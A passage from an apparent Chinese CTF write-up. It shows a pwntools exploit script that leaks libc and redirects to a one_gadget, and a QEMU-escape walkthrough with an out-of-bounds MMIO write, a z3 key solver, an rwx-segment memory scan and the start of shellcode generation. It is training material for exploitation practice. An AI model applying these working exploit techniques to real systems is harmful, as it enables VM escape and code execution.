class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;120.46.65.156&quot;</span>,<span class="number">32104</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&quot;8d23w&quot;</span>) <span class="comment"># [10,15]d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># aaaaaaaa pointer heap_addr libc_addr stack_addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 80 24 ee 19 2e 7f</span></span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0xcbd1a</span>,<span class="number">0xcbd1d</span>,<span class="number">0xcbd20</span>,<span class="number">0xcbcba</span>,<span class="number">0xcbcbd</span>,<span class="number">0xcbcc0</span>]</span><br><span class="line"></span><br><span class="line">leak_addr = u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">leak_addr = (leak_addr)+<span class="number">0x7f0000000000</span></span><br><span class="line">libc_base = leak_addr  - <span class="number">0x026d0a</span></span><br><span class="line">one_gadget = libc_base + one_gadgets[<span class="number">5</span>]</span><br><span class="line">system = libc_base + <span class="number">0x048e50</span></span><br><span class="line"></span><br><span class="line">offset = one_gadget - leak_addr</span><br><span class="line">offset2 = one_gadget - system</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&quot;offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">success(<span class="string">&quot;offset2 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(offset2))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&quot;7a&quot;</span>+<span class="built_in">str</span>(offset%<span class="number">0x100</span>)+<span class="string">&quot;w&quot;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&quot;d&quot;</span>+<span class="built_in">str</span>((offset&gt;&gt;<span class="number">8</span>)%<span class="number">0x100</span>)+<span class="string">&quot;w&quot;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&quot;d&quot;</span>+<span class="built_in">str</span>((offset&gt;&gt;<span class="number">16</span>)%<span class="number">0x100</span>)+<span class="string">&quot;w&quot;</span>)</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&quot;7d&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="qemu-playground-2"><a href="#qemu-playground-2" class="headerlink" title="qemu playground - 2"></a>qemu playground - 2</h2><p>第一次打 qemu 逃逸类的题目，先查看 qemu 版本并恢复符号：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">QEMU emulator version <span class="number">8.1</span><span class="number">.50</span> (v8<span class="number">.1</span><span class="number">.0</span><span class="number">-1639</span>-g63011373ad-dirty)</span><br><span class="line">Copyright (c) <span class="number">2003</span><span class="number">-2023</span> Fabrice Bellard <span class="keyword">and</span> the QEMU Project developers</span><br></pre></td></tr></table></figure>
<ul>
<li><a target="_blank" rel="noopener" href="https://download.qemu.org/qemu-8.1.0.tar.xz">https://download.qemu.org/qemu-8.1.0.tar.xz</a></li>
</ul>
<p>下载后使用如下命令进行编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>
<p>利用 bindiff 和有符号的 qemu-system-x86_64 来恢复题目文件的符号</p>
<p><strong>漏洞分析</strong></p>
<p>qemu 逃逸一般在如下4个函数中出现 BUG：</p>
<ul>
<li>pmio_read：读设备寄存器的物理地址（使用 <code>in()</code> 触发）</li>
<li>pmio_write：写设备寄存器的物理地址（使用 <code>out()</code> 触发）</li>
<li>mmio_read：读设备寄存器的虚拟地址（使用 mmap 映射物理内存，读这片区域时触发） </li>
<li>mmio_write：写设备寄存器的虚拟地址（使用 mmap 映射物理内存，写这片区域时触发）</li>
</ul>
<p>MMIO：通过 kernel 提供的 sysfs，我们可以直接映射出设备对应的内存，具体方法是打开类似 <code>/sys/devices/pci0000:00/0000:00:04.0/resource0</code> 的文件 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>  mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">mmio = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>读写 mmio 内存区域就会触发 mmio_read / mmio_write</li>
</ul>
<p>PMIO：使用特殊的 CPU 指令 in/out 执行 I/O 操作，这些指令可以读/写 1,2,4 个字节（outb, outw, outl），通过 iopl 和 ioperm 这两个系统调用对 port 的权能进行设置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iopl(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 in/out 指令就会触发 pmio_read / pmio_write</li>
</ul>
<p>程序限制的边界为 addr &lt;= 0x40，可以覆盖堆指针后4字节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">actf_mmio_write</span><span class="params">(Node *opaque, <span class="keyword">unsigned</span> __int64 addr, <span class="keyword">int</span> val, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">0x40</span> )</span><br><span class="line">        *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)opaque-&gt;data1 + addr) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)opaque-&gt;data1 + addr) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序有 rwx 段：（不知道是题目设置的还是 qemu 自带的）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f9bee400000</span>     <span class="number">0x7f9bee401000</span> ---p     <span class="number">1000</span> <span class="number">0</span>      [anon_7f9bee400]</span><br><span class="line"><span class="number">0x7f9bee4ce000</span>     <span class="number">0x7f9c2bfff000</span> rwxp <span class="number">3</span>db31000 <span class="number">0</span>      [anon_7f9bee4ce]</span><br><span class="line"><span class="number">0x7f9c2bfff000</span>     <span class="number">0x7f9c2c000000</span> ---p     <span class="number">1000</span> <span class="number">0</span>      [anon_7f9c2bfff]</span><br></pre></td></tr></table></figure>
<p>qemu 的调试需要先使用如下命令关闭保护：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl kernel.yama.ptrace_scope=0</span><br></pre></td></tr></table></figure>
<p>然后使用 gdb attach pid 进行调试</p>
<p><strong>入侵思路</strong></p>
<p>为了使 <code>opaquet-&gt;field_A31 = 1</code> 成立，我们需要先进行逆向：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  *(_DWORD *)keyt = v2;</span><br><span class="line">  keyt = (<span class="keyword">char</span> *)keyt + <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( keyt != key2 );</span><br><span class="line">index = -(<span class="keyword">int</span>)data3;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  data1_head = &amp;data1;</span><br><span class="line">  keyt = key1;</span><br><span class="line">  data2 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)opaquet-&gt;data2);</span><br><span class="line">  data1 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)opaquet-&gt;data1);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    re = (<span class="keyword">unsigned</span> __int8)(*(_BYTE *)data1_head ^ data3-&gt;m128i_i8[<span class="number">0</span>]);</span><br><span class="line">    keyt = (<span class="keyword">char</span> *)keyt + <span class="number">1</span>;</span><br><span class="line">    v13 = *((<span class="keyword">char</span> *)keyt - <span class="number">1</span>) ^ (index + (_BYTE)data3);</span><br><span class="line">    data3 = (<span class="keyword">const</span> __m128i *)((<span class="keyword">char</span> *)data3 + <span class="number">1</span>);</span><br><span class="line">    data1_head = (<span class="keyword">char</span> *)data1_head + <span class="number">1</span>;</span><br><span class="line">    *((<span class="keyword">char</span> *)keyt - <span class="number">1</span>) = v13;</span><br><span class="line">    *((<span class="keyword">char</span> *)data1_head - <span class="number">1</span>) = v13 ^ re;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( keyt != key2 );</span><br><span class="line">  data1 = _mm_load_si128(&amp;data1);</span><br><span class="line">  LOBYTE(index) = index + <span class="number">0x11</span>;</span><br><span class="line">  data2 = _mm_load_si128(&amp;data2);</span><br><span class="line">  *data = _mm_loadu_si128(data3);</span><br><span class="line">  data[<span class="number">1</span>] = _mm_loadu_si128(data3 + <span class="number">1</span>);</span><br><span class="line">  *(__m128i *)opaquet-&gt;data3 = data1;</span><br><span class="line">  *(__m128i *)opaquet-&gt;data4 = data2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( (_BYTE)index != <span class="number">0xAA</span> - (_BYTE)data3 );</span><br><span class="line">key2[<span class="number">0</span>] = <span class="number">0xABA29EC2A98DD89A</span>LL;</span><br><span class="line">*((_QWORD *)&amp;cp + <span class="number">1</span>) = *(_QWORD *)opaquet-&gt;data1 ^ <span class="number">0xABA29EC2A98DD89A</span>LL;</span><br><span class="line">key2[<span class="number">1</span>] = <span class="number">0xBBF1B4AB81B4A9D4</span>LL;</span><br><span class="line">*(_QWORD *)&amp;cp = data-&gt;m128i_i64[<span class="number">1</span>] ^ <span class="number">0xBBF1B4AB81B4A9D4</span>LL;</span><br><span class="line">key2[<span class="number">2</span>] = <span class="number">0xFB92A48DB386FFA8</span>LL;</span><br><span class="line">key2[<span class="number">3</span>] = <span class="number">0xEFB491B8AFB4ABD3</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( cp == <span class="number">0</span> &amp;&amp; !(key2[<span class="number">2</span>] ^ data[<span class="number">1</span>].m128i_i64[<span class="number">0</span>] | data[<span class="number">1</span>].m128i_i64[<span class="number">1</span>] ^ <span class="number">0xEFB491B8AFB4ABD3</span>LL) )</span><br><span class="line">&#123;</span><br><span class="line">  data1.m128i_i64[<span class="number">0</span>] = <span class="number">0x80EF69F1CBD00397</span>LL;</span><br><span class="line">  *((_QWORD *)&amp;cp + <span class="number">1</span>) = *(_QWORD *)opaquet-&gt;data3 ^ <span class="number">0x80EF69F1CBD00397</span>LL;</span><br><span class="line">  data1.m128i_i64[<span class="number">1</span>] = <span class="number">0xB2EB07859CDA52D3</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;cp = data3-&gt;m128i_i64[<span class="number">1</span>] ^ <span class="number">0xB2EB07859CDA52D3</span>LL;</span><br><span class="line">  data2.m128i_i64[<span class="number">0</span>] = <span class="number">0xEC9E22F5A5A07FA3</span>LL;</span><br><span class="line">  data2.m128i_i64[<span class="number">1</span>] = <span class="number">0x4B36DF7B5B655A84</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( cp == <span class="number">0</span> &amp;&amp; !(data2.m128i_i64[<span class="number">0</span>] ^ data3[<span class="number">1</span>].m128i_i64[<span class="number">0</span>] | data3[<span class="number">1</span>].m128i_i64[<span class="number">1</span>] ^ <span class="number">0x4B36DF7B5B655A84</span>LL) )</span><br><span class="line">    opaquet-&gt;field_A31 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">opaquet-&gt;field_A30 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>加密的正向逻辑就是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code1</span>(<span class="params">index</span>):</span></span><br><span class="line">    <span class="keyword">global</span> key</span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        re = data[<span class="number">0</span>*<span class="number">0x10</span>+i] ^ data[<span class="number">2</span>*<span class="number">0x10</span>+i]</span><br><span class="line"></span><br><span class="line">        v13 = key[i] ^ ((i+index*<span class="number">0x11</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">        key[i] = v13</span><br><span class="line">        data[i] = v13 ^ re</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        tmp.append(data[i+<span class="number">0x20</span>])</span><br><span class="line">        data[i+<span class="number">0x20</span>] = data[i]</span><br><span class="line">        data[i] = tmp[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    code1(i)</span><br></pre></td></tr></table></figure>
<p>我们可以直接用 z3 求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data = [] <span class="comment"># 0x40</span></span><br><span class="line">key = [] <span class="comment"># 0x20</span></span><br><span class="line"></span><br><span class="line">x = Solver()</span><br><span class="line">data = [BitVec((<span class="string">&#x27;ans[%s]&#x27;</span> % i),<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>)] </span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        key.append(<span class="number">0x7f</span>)</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        key.append(<span class="number">0xac</span>)</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        key.append(<span class="number">0x34</span>)</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        key.append(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code1</span>(<span class="params">index</span>):</span></span><br><span class="line">    <span class="keyword">global</span> key</span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    tmp = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        re = data[<span class="number">0</span>*<span class="number">0x10</span>+i] ^ data[<span class="number">2</span>*<span class="number">0x10</span>+i]</span><br><span class="line"></span><br><span class="line">        v13 = key[i] ^ ((i+index*<span class="number">0x11</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">        key[i] = v13</span><br><span class="line">        data[i] = v13 ^ re</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        tmp.append(data[i+<span class="number">0x20</span>])</span><br><span class="line">        data[i+<span class="number">0x20</span>] = data[i]</span><br><span class="line">        data[i] = tmp[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    code1(i)</span><br><span class="line"></span><br><span class="line">data2 = [<span class="number">0xABA29EC2A98DD89A</span>,<span class="number">0xBBF1B4AB81B4A9D4</span>,<span class="number">0xFB92A48DB386FFA8</span>,<span class="number">0xEFB491B8AFB4ABD3</span>,<span class="number">0x80EF69F1CBD00397</span>,<span class="number">0xB2EB07859CDA52D3</span>,<span class="number">0xEC9E22F5A5A07FA3</span>,<span class="number">0x4B36DF7B5B655A84</span>]</span><br><span class="line">code = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        code.append(((data2[i]&gt;&gt;(j*<span class="number">8</span>))&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i)),</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    x.add(data[i]==code[i])</span><br><span class="line"></span><br><span class="line">check = x.check()</span><br><span class="line">ans = []</span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    ans.append(-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check):</span><br><span class="line">    model = x.model()</span><br><span class="line">    <span class="built_in">print</span>(model)</span><br></pre></td></tr></table></figure>
<p>得到解密密钥：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> data[<span class="number">0x10</span>] = &#123;<span class="number">1179927361</span>, <span class="number">860382075</span>, <span class="number">828328803</span>, <span class="number">1232559982</span>, <span class="number">1113548855</span>, <span class="number">1601790528</span>, <span class="number">1752183107</span>, <span class="number">1415541299</span>, <span class="number">1601447013</span>, <span class="number">1365208625</span>, <span class="number">1599425843</span>, <span class="number">2033478768</span>, <span class="number">1968124775</span>, <span class="number">828335182</span>, <span class="number">1095065380</span>, <span class="number">2099345747</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>之后我尝试在 rwx 段上打断点，发现可以断上：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f9bee4ce000</span>    push   rbp</span><br><span class="line">  <span class="number">0x7f9bee4ce001</span>    push   rbx</span><br><span class="line">  <span class="number">0x7f9bee4ce002</span>    push   r12</span><br></pre></td></tr></table></figure>
<p>然后利用堆上遗留的数据就可以很轻松地泄露 heap_base，由于 qemu heap 的偏移有随机化，只能扫描整个内存来尝试查找 rwx 段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f9bee4ce000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rip <span class="number">0x7f9bee4ce000</span> ◂— push   rbp <span class="comment">/* 0x5641554154415355 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7f9bee4ce008</span> ◂— push   r15 <span class="comment">/* 0xc48148ef8b485741 */</span></span><br></pre></td></tr></table></figure>
<p>泄露的脚本如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> dump = <span class="number">0</span>;</span><br><span class="line">    mmio_write(<span class="number">0x40</span>, target_addr);</span><br><span class="line">    dump += pmio_read(<span class="number">0x10</span>);</span><br><span class="line">    mmio_write(<span class="number">0x40</span>, target_addr + <span class="number">4</span>);</span><br><span class="line">    dump += pmio_read(<span class="number">0x10</span>) * <span class="number">0x100000000</span>;</span><br><span class="line"></span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;%d: *(0x%x)=0x%lx \n&quot;</span>, i,target_addr,dump);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dump == <span class="number">0x5641554154415355</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        shellcode_addr = target_addr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;shellcode_addr &gt;&gt; 0x%x\n&quot;</span>, shellcode_addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    target_addr -= <span class="number">0x1000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后还要解决一个问题，rwx 段的执行频率很高（差不多每写一次都要执行一次），因此我们先在程序的正常代码后写入 shellcode</p>
<p>写好以后一次性覆盖程序的 ret 为 nop 从而执行 shellcode，下面是生成 shellcode 的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_open = shellcraft.pushstr(<span class="string">&quot;flag&quot;</span>) + shellcraft.<span class="built_in">open</span>(<span class="string">&quot;rsp&quot;</span>)</span><br><span class="line">shellcode_read 